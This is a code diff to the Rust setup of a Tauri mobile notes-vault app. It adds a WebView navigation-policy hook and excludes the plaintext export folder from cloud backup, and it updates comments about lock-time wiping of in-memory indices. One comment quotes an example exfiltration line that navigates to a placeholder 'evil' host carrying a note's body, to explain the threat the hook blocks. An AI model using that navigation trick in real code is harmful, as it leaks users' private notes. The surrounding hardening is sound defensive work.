@@ -32,9 +32,19 @@ pub use myne_core::{
     vault_meta_hash, vault_registry,
 };
 
+// myne-md/myne#491: keep the plaintext export directory out of the platform's
+// automatic cloud backup. iOS does it at runtime (the module); Android does it
+// declaratively from the committed `android-widgets` manifest. Declared for both
+// so the setup hook has one unconditional call site.
+mod backup_exclude;
 mod hooks;
 #[cfg(target_os = "ios")]
 mod ios_chrome;
+// myne#453 (the mobile twin of myne#383): the app-global WebView navigation
+// policy. The CSP has no directive that governs a top-level navigation, so
+// `location = "https://evil/?d=" + noteBody` is outside every policy this
+// `tauri.conf.json` can express; the `on_navigation` hook is.
+mod navigation;
 mod pdf_export;
 mod plugins;
 mod screen_guard;
@@ -101,6 +111,13 @@ pub fn run() {
         .try_init();
 
     tauri::Builder::default()
+        // myne#453: the app-global navigation policy, registered FIRST so the
+        // rule about what may load precedes every plugin that can cause a load.
+        // Order is functionally irrelevant — the plugin store is read at
+        // navigation time and fans out AND-style — but this is the one hook
+        // that reaches the config-declared `main` window, and it reads as the
+        // gate it is where it sits.
+        .plugin(navigation::init())
         .plugin(tauri_plugin_opener::init())
         // Custom-scheme delivery for the iOS widgets (`myne://open` /
         // `myne://capture`). Registered here so the WebView can read the launch
@@ -283,28 +300,47 @@ pub fn run() {
             // MYND-31: app-level live in-RAM VaultIndices state (wikilink graph
             // + backlinks + tag index + typed properties), rebuilt on unlock by
             // the TS-orchestrated sweep. Mirrors the desktop `app.manage(...)`
-            // wiring; the lock-teardown wipe is a desktop-only hooks side-effect
-            // (mobile installs NoopHooks), so nothing tears it down here.
+            // wiring, INCLUDING the lock teardown: `MobileHooks::zeroize_vault_indices`
+            // clears this on every slot drop (myne#454), and
+            // `scripts/check-lock-teardown.mjs` fails if a client holds this state
+            // with an empty hook body. This comment used to say mobile installed
+            // `NoopHooks` and nothing tore it down, which is what the guard exists
+            // to stop a reader from having to believe.
             app.manage(plugins::vault_indices::VaultIndicesState::default());
             // MYS1: app-level live in-RAM full-text search index (BM25). Fed by
             // the WebView via `search_index_replace` (the mobile client already
             // holds every note's plaintext, so it pushes the corpus down — no
             // Rust-side decryption/hydrate). Mirrors the desktop `app.manage(...)`
-            // wiring; the lock-teardown wipe is a desktop-only hooks side-effect
-            // (mobile installs NoopHooks), so nothing tears it down here — the
-            // frontend re-pushes the corpus on the next unlock.
+            // wiring, INCLUDING the lock teardown: `MobileHooks::zeroize_search_index`
+            // clears this on every slot drop (myne#454) and the frontend re-pushes
+            // the corpus on the next unlock. The wipe is one half; `note_search`
+            // is slot-gated so a locked vault's index cannot answer through the
+            // IPC door either, which is the property the shared `lock_from_host`
+            // rests its no-leak claim on.
             app.manage(myne_core::search::SearchIndexState::default());
             // MYND-169: app-level live in-RAM attachment reference graph
             // (note → attachment-ids), rebuilt on unlock by the TS-orchestrated
-            // note sweep. Mirrors the desktop `app.manage(...)` wiring; the
-            // lock-teardown wipe is a desktop-only hooks side-effect (mobile
-            // installs NoopHooks), so nothing tears it down here.
+            // note sweep. Mirrors the desktop `app.manage(...)` wiring, INCLUDING
+            // the lock teardown: `MobileHooks::zeroize_attachment_refs` clears this
+            // on every slot drop (myne#454), and the three attachment-ref commands
+            // are slot-gated besides.
             app.manage(plugins::attachments::AttachmentRefsState::default());
             // Kill the native WKWebView keyboard "form assistant" bar (the
             // ‹ › ⌄ Done strip UIKit draws above the keyboard) — no web-side fix
             // exists for it. See `ios_chrome`. iOS-only; no-op elsewhere.
             #[cfg(target_os = "ios")]
             ios_chrome::suppress_keyboard_accessory_bar();
+
+            // myne-md/myne#491: exclude the plaintext export directory from the
+            // platform's automatic cloud backup, BEFORE any flow can write into
+            // it. Four flows put plaintext there (recovery phrase / account
+            // number, the whole-vault markdown tree, a note's PDF, an exported
+            // attachment) and iCloud Backup carried all four; a saved recovery
+            // phrase alone reconstructs the vault. Directory-level, so it covers
+            // future writers too. iOS does it here; Android carries the same
+            // property declaratively from the committed `android-widgets`
+            // manifest, so this is a no-op there. See `backup_exclude`.
+            backup_exclude::init(app.handle());
 
             // MYND-469: one-time secure-field layer splice, protection ON —
             // the pre-unlock always-ON invariant from before the first painted
@@ -364,7 +400,7 @@ pub fn run() {
             }
 
             // Native file share/save (MYND-475). Export/download flows write the
-            // file to Documents (reachable, no regression) and then emit
+            // file to Documents (additive, no regression) and then emit
             // SHARE_FILE_EVENT with the path; present the platform share sheet
             // (iOS: UIActivityViewController → Save to Files) on the main thread
             // so the user can pick a destination. Android is a documented no-op.
